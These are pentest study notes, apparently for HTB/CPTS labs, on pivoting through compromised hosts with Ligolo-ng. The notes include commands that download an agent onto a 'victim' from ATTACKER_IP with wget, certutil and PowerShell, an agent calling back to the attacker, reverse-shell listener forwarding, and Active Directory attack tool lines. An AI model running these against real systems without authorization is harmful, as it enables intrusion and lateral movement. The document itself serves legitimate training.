# Ligolo-ng Complete Pivoting Guide (HTB / CPTS Notes)

## Official Resources

- Ligolo-ng GitHub: https://github.com/nicocha30/ligolo-ng
- Ligolo-ng Releases: https://github.com/nicocha30/ligolo-ng/releases

---

# 1. What Is Ligolo-ng?

Ligolo-ng is a tunneling/pivoting tool commonly used in:

- Hack The Box
- CPTS Labs
- Internal Network Pivoting
- Segmented Environments
- Red Team Labs

Unlike SOCKS-only tunneling tools, Ligolo-ng creates a TUN interface with a network-level tunnel and proper routing path. This allows native scans, SYN scans, faster enumeration, better compatibility, and less dependency on proxychains.

---

# 2. Why Ligolo-ng Is Better Than SOCKS Pivoting

## Traditional SOCKS Pivot

```text
Attacker -> SOCKS Proxy -> Victim -> Internal Network
```

Problems: proxychains required, no SYN scans, some tools break, slower scans, DNS issues, application-layer only.

## Ligolo-ng Pivot

```text
Attacker -> TUN Interface -> Victim -> Internal Network
```

Advantages: native routing, no proxychains needed, supports SYN scans, better Nmap support, faster and cleaner — feels like direct network access.

---

# 3. Architecture

```text
[Kali Attacker]
       |
  Ligolo Proxy
       |
Encrypted Tunnel
       |
  Ligolo Agent
       |
[Compromised Host]
       |
 Internal Network
```

---

# 4. Components

| Component | Runs On |
|---|---|
| Proxy | Attacker Machine |
| Agent | Compromised Host |

---

# 5. Typical CPTS Scenario

```text
[Kali]
   |
 Internet
   |
[DMZ Host]
   |
10.10.20.0/24
```

Goal: Access internal network through DMZ foothold, enumerate internal systems, pivot deeper into restricted subnets.

---

# 6. Downloading Ligolo-ng

## On Kali (Attacker) — Download Proxy

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
chmod +x proxy
```

## Download Agent

**Linux:**
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```

**Windows:**
```text
ligolo-ng_agent_windows_amd64.zip
```

---

# 7. Uploading the Agent to Victim

## Linux Upload Methods

### Python HTTP Server

On attacker:
```bash
python3 -m http.server 80
```

On victim:
```bash
wget http://ATTACKER_IP/agent
chmod +x agent
```

## Windows Upload Methods

### certutil
```powershell
certutil -urlcache -split -f http://ATTACKER_IP/agent.exe agent.exe
```

### PowerShell Download Cradle
```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP/agent.exe -OutFile agent.exe
```

### SMB Server

On attacker:
```bash
impacket-smbserver share . -smb2support
```

On victim:
```powershell
copy \\ATTACKER_IP\share\agent.exe agent.exe
```

---

# 8. Starting the Ligolo Proxy

Both CLI and Web UI start from the same binary. Choose your preferred method:

## CLI Only (Minimal)

```bash
sudo ./proxy -selfcert
```

Default listening port: `11601`. You should see:
```text
Listening on 0.0.0.0:11601
```

## CLI + Web UI Enabled

```bash
sudo ./proxy -selfcert -api-laddr 127.0.0.1:8080
```

This starts the proxy AND the Web UI/API on port 8080 simultaneously.

| Argument | Meaning |
|---|---|
| `-selfcert` | Auto-generate TLS certificate (required) |
| `-api-laddr` | Bind address for the Web UI and API |

> **Note (Ligolo-ng 0.8.x):** The `-web` and `-web-listen` flags from older tutorials are no longer valid. Use `-api-laddr` instead.

---

# 9. Accessing the Web UI

After starting with `-api-laddr`, open your browser:

```text
https://127.0.0.1:8080
```

> **Important:** Use `https://` — not `http://`. Because certificates are self-signed, accept the browser security warning and continue.

**Default login:**
- Username: `ligolo`
- Password: matches the Argon2 hash in your config (see Section 10)

To generate your own password hash:
```bash
python3 -c 'from argon2 import PasswordHasher; print(PasswordHasher().hash("Password123"))'
```

---

# 10. Optional: Web UI YAML Config

For more control over the Web UI, create `ligolo-ng.yaml`:

```yaml
agent:
  deadbeefcafe:
    autobind: true
    interface: ligolo

interface:
  ligolo:
    routes:
      - 10.254.0.0/24
      - 10.255.0.0/24

web:
  enabled: true
  enableui: true
  listen: 127.0.0.1:8080
  logfile: ui.log
  users:
    ligolo: $$argon2id$$v=19$$m=32768,t=3,p=4$$X5/VpaFndCcwy0KtypOYaA$$lYs+nwhURcA86t+xogmJf98alHmx527Ph7AK5kq5TNM
```

> **Critical:** Do NOT manually define `certfile:` or `keyfile:` unless actual certificate files exist — Ligolo will fail with `Could not load TLS certificate`. Always use `-selfcert` instead.

---

# 11. Connecting the Agent

Run the agent on the **compromised host** to connect back to your proxy.

## Linux Victim
```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

## Windows Victim
```powershell
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

| Argument | Purpose |
|---|---|
| `-connect` | Connect to attacker proxy |
| `-ignore-cert` | Ignore self-signed cert |

---

# 12. Selecting a Session

Once an agent connects, you must select it before doing anything else.

## CLI

Inside the Ligolo console:
```text
session
```

Example output:
```text
1 - WINDOWS01 - 10.10.10.5
```

Select it:
```text
session 1
```

## Web UI

Open the browser at `https://127.0.0.1:8080`. Navigate to the **Sessions** (or **Connected Agents**) panel. You will see the connected agent listed — click to select it. All subsequent actions (routes, tunnel start, listeners) apply to the selected session.

---

# 13. Creating the TUN Interface

> **THIS STEP IS CRITICAL.** Without the TUN interface, routing will not work, scans will fail, and internal access will not work. This is done on the **attacker machine**.

## CLI

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

Verify:
```bash
ip a
```

You should see `ligolo` listed as an interface.

## Web UI

The Web UI's **Interfaces** panel shows all available TUN interfaces. If `ligolo` does not exist yet, you must still create it via the CLI commands above — the OS-level interface must be created before the Web UI can manage it. Once created and brought up, it will appear in the Interfaces panel for assignment and route management.

---

# 14. Adding Routes

Suppose the compromised host can access `10.10.20.0/24`. You must route traffic through the tunnel on the attacker machine.

## CLI

### Single Subnet
```bash
sudo ip route add 10.10.20.0/24 dev ligolo
```

### Multiple Subnets
```bash
sudo ip route add 10.10.20.0/24 dev ligolo
sudo ip route add 172.16.5.0/24 dev ligolo
sudo ip route add 192.168.50.0/24 dev ligolo
```

## Web UI

Navigate to the **Routes** panel. Click **Add Route**, enter the subnet (e.g. `10.10.20.0/24`), select the `ligolo` interface, and confirm. You can add, view, and delete routes from this panel without touching the CLI. Multiple subnets can be managed individually with full visibility.

---

# 15. Starting the Tunnel

## CLI

Inside the Ligolo console (after selecting a session):
```text
start
```

## Web UI

In the **Sessions** or **Agents** panel, with your session selected, click the **Start Tunnel** button. The tunnel status indicator will update to show it is active. This is equivalent to the `start` command in CLI.

---

# 16. Verifying Connectivity

## Ping Test
```bash
ping 10.10.20.5
```

## Nmap Test
```bash
nmap -Pn 10.10.20.5
```

> The Web UI does not perform connectivity tests directly — use CLI tools on the attacker machine to verify.

---

# 17. Why Nmap Works Better with Ligolo

Unlike SOCKS proxies, Ligolo supports SYN scans and native sockets, so:
```bash
nmap -sS -Pn 10.10.20.5
```
actually works without proxychains.

---

# 18. Recommended Nmap Scans

### Fast Discovery
```bash
nmap -Pn 10.10.20.0/24
```

### SYN Scan
```bash
nmap -sS -Pn 10.10.20.5
```

### Service Detection
```bash
nmap -sV -sC -Pn 10.10.20.5
```

### Full Port Scan
```bash
nmap -p- -Pn 10.10.20.5
```

---

# 19. Port Forwarding

Sometimes you only need to expose one specific service (e.g. RDP on `10.10.20.5:3389`).

## CLI

Inside the Ligolo console:
```text
listener_add --addr 127.0.0.1:3389 --to 10.10.20.5:3389
```

## Web UI

Navigate to the **Listeners** panel. Click **Add Listener**, then fill in:
- **Listen Address:** `127.0.0.1:3389`
- **Forward To:** `10.10.20.5:3389`

Confirm to create the forward. All active listeners are listed here and can be deleted individually — much easier to manage than CLI when dealing with multiple forwards.

## Connect via RDP
```bash
xfreerdp /v:127.0.0.1
```

---

# 20. Reverse Shell Forwarding

Useful for receiving payload callbacks from the internal network.

## CLI

Inside the Ligolo console:
```text
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

## Web UI

In the **Listeners** panel, add a listener:
- **Listen Address:** `0.0.0.0:4444`
- **Forward To:** `127.0.0.1:4444`

Now reverse shells from the internal network will reach your attacker listener on port 4444.

---

# 21. Enumerating Reachable Networks

Once tunneled in, map out what the victim can reach.

## Linux
```bash
ip route
ip a
arp -a
```

## Windows
```powershell
route print
ipconfig /all
arp -a
```

Look for additional interfaces, static routes, VPN routes, Docker networks, and internal VLANs. Common ranges:
```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

---

# 22. Tools Through Ligolo (No Proxychains Needed)

Once routes are active, all tools work natively:

### BloodHound
```bash
bloodhound-python -u USER -p PASS -d DOMAIN.LOCAL -c All -ns 10.10.20.5
```

### CrackMapExec
```bash
crackmapexec smb 10.10.20.0/24
```

### Evil-WinRM
```bash
evil-winrm -i 10.10.20.5 -u administrator -p Password123
```

### SMB
```bash
smbclient -L //10.10.20.5 -U administrator
```

### LDAP
```bash
ldapsearch -x -H ldap://10.10.20.5
```

### Kerberos
```bash
kerbrute userenum --dc 10.10.20.5 users.txt -d DOMAIN.LOCAL
```

---

# 23. Double Pivoting

Very common in CPTS.

```text
[Kali]
   |
[DMZ Host]
   |
[Internal Host]
   |
[Restricted Network]
```

**Workflow:**

1. Compromise DMZ host
2. Deploy first Ligolo agent
3. Pivot into internal network
4. Compromise second internal host
5. Deploy second Ligolo agent
6. Add more routes
7. Pivot deeper

## CLI — Double Pivot

After selecting the second session in the Ligolo console:
```text
session
session 2
```
Then add routes for the new subnet:
```bash
sudo ip route add 192.168.50.0/24 dev ligolo
```
Then start the second tunnel:
```text
start
```

## Web UI — Double Pivot

When the second agent connects, it appears as a new entry in the **Sessions** panel. Select it, assign it to the `ligolo` interface, navigate to **Routes** to add the new subnet, and click **Start Tunnel** for that session. The Web UI makes it easy to keep track of multiple active sessions and their respective routes simultaneously — a major advantage over CLI for deep pivot chains.

---

# 24. Verifying API Is Listening (Web UI Troubleshooting)

If you cannot access the Web UI, verify the API port is bound:

```powershell
# Windows
netstat -ano | findstr 8080
```

```bash
# Linux
ss -tlnp | grep 8080
```

Expected output:
```text
127.0.0.1:8080
```

---

# 25. Common Web UI Problems & Fixes

## Browser CORS Error

```text
Cross-Origin Request Blocked
```

This is usually NOT a real CORS issue. Common causes: backend API not running, stale browser cache, or accessing via `http://` instead of `https://`.

**Fix:** Ensure you started proxy with `-selfcert -api-laddr 127.0.0.1:8080` and access via `https://127.0.0.1:8080`.

## Clear Browser Cache

Firefox:
```text
Ctrl + Shift + Delete  → clear Cache and Site Data
```

Or use private mode:
```text
Ctrl + Shift + P
```

---

# 26. Troubleshooting

## Tunnel Starts But No Traffic

- Did you add routes?
- Did you run `start`?
- Is the subnet correct?
- Can the victim actually reach the target?
- Is a firewall blocking traffic?

## Interface Exists But Scan Fails

```bash
ip route   # verify route exists
ip a       # verify ligolo interface is up
```

Then try pinging an internal host.

## Permission Errors

```bash
sudo ./proxy -selfcert
# OR grant capability
sudo setcap cap_net_admin+eip ./proxy
```

## Windows Firewall Issues

Targets may block ICMP or SMB. Always use:
```bash
nmap -Pn
```

---

# 27. Web UI Panel Summary

| Panel | Purpose | CLI Equivalent |
|---|---|---|
| Sessions | View and select connected agents | `session` / `session N` |
| Interfaces | Manage TUN interfaces | `ip tuntap` / `ip link` |
| Routes | Add/remove subnet routes | `ip route add` |
| Listeners | Create port/service forwards | `listener_add` |
| Agents | Manage pivot points | session management |
| Logs | View activity | console output |

---

# 28. OPSEC Notes

Ligolo traffic is TLS encrypted and blends better than raw tunnels, but may still trigger EDR/NDR in real environments. In HTB/CPTS labs this is usually irrelevant.

---

# 29. Ligolo-ng vs Chisel

| Feature | Chisel | Ligolo-ng |
|---|---|---|
| SOCKS Proxy | Yes | Optional |
| Native Routing | No | Yes |
| SYN Scans | No | Yes |
| Proxychains Needed | Usually | No |
| Multi-hop | Moderate | Excellent |
| Speed | Moderate | Fast |
| CPTS Value | High | Very High |

---

# 30. Full CPTS Workflow

```text
Initial Foothold
      ↓
Upload Ligolo Agent
      ↓
Start Proxy (with or without -api-laddr for Web UI)
      ↓
[Optional] Open Web UI at https://127.0.0.1:8080
      ↓
Create TUN Interface (CLI required once)
      ↓
Connect Agent from Victim
      ↓
Select Session (CLI: session N | Web UI: click session)
      ↓
Add Routes (CLI: ip route add | Web UI: Routes panel)
      ↓
Start Tunnel (CLI: start | Web UI: Start Tunnel button)
      ↓
Enumerate Internal Network
      ↓
Compromise New Host → Deploy Another Agent
      ↓
Repeat: Select New Session → Add Routes → Start Tunnel
      ↓
Pivot Deeper
```

---

# 31. Complete Quick Cheat Sheet

## Start Proxy (CLI only)
```bash
sudo ./proxy -selfcert
```

## Start Proxy (CLI + Web UI)
```bash
sudo ./proxy -selfcert -api-laddr 127.0.0.1:8080
```

## Open Web UI
```text
https://127.0.0.1:8080
```

## Connect Agent (Linux)
```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

## Connect Agent (Windows)
```powershell
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

## Create TUN Interface
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

## Add Route
```bash
sudo ip route add 10.10.20.0/24 dev ligolo
```
*Web UI alternative: Routes panel → Add Route*

## Select Session
```text
session
session 1
```
*Web UI alternative: Sessions panel → click agent*

## Start Tunnel
```text
start
```
*Web UI alternative: Sessions panel → Start Tunnel button*

## Ping Internal Host
```bash
ping 10.10.20.5
```

## SYN Scan
```bash
nmap -sS -Pn 10.10.20.5
```

## Full Scan
```bash
nmap -sV -sC -Pn 10.10.20.5
```

## Port Forward
```text
listener_add --addr 127.0.0.1:3389 --to 10.10.20.5:3389
```
*Web UI alternative: Listeners panel → Add Listener*

## RDP Access
```bash
xfreerdp /v:127.0.0.1
```

---

# 32. Final CPTS Advice

For HTB/CPTS, master these fundamentals regardless of whether you use CLI or Web UI:

- Understand routes — most pivoting failures happen because routes were wrong or missing
- Know your subnets — always verify what the victim can reach before adding routes
- Understand TUN vs SOCKS — Ligolo creates a real network-level tunnel
- Practice double pivots — they are very common in CPTS
- Use the Web UI for complex pivot chains — managing multiple sessions and routes visually reduces mistakes
- Use CLI for quick single-pivot setups — it is faster once memorized

Most pivoting failures happen because:
- Routes were wrong or missing
- Tunnel was not started
- Target was unreachable from victim
- Firewall rules blocked access

Mastering Ligolo-ng is one of the highest-value skills for CPTS, Active Directory labs, internal network assessments, and real-world segmented environments.
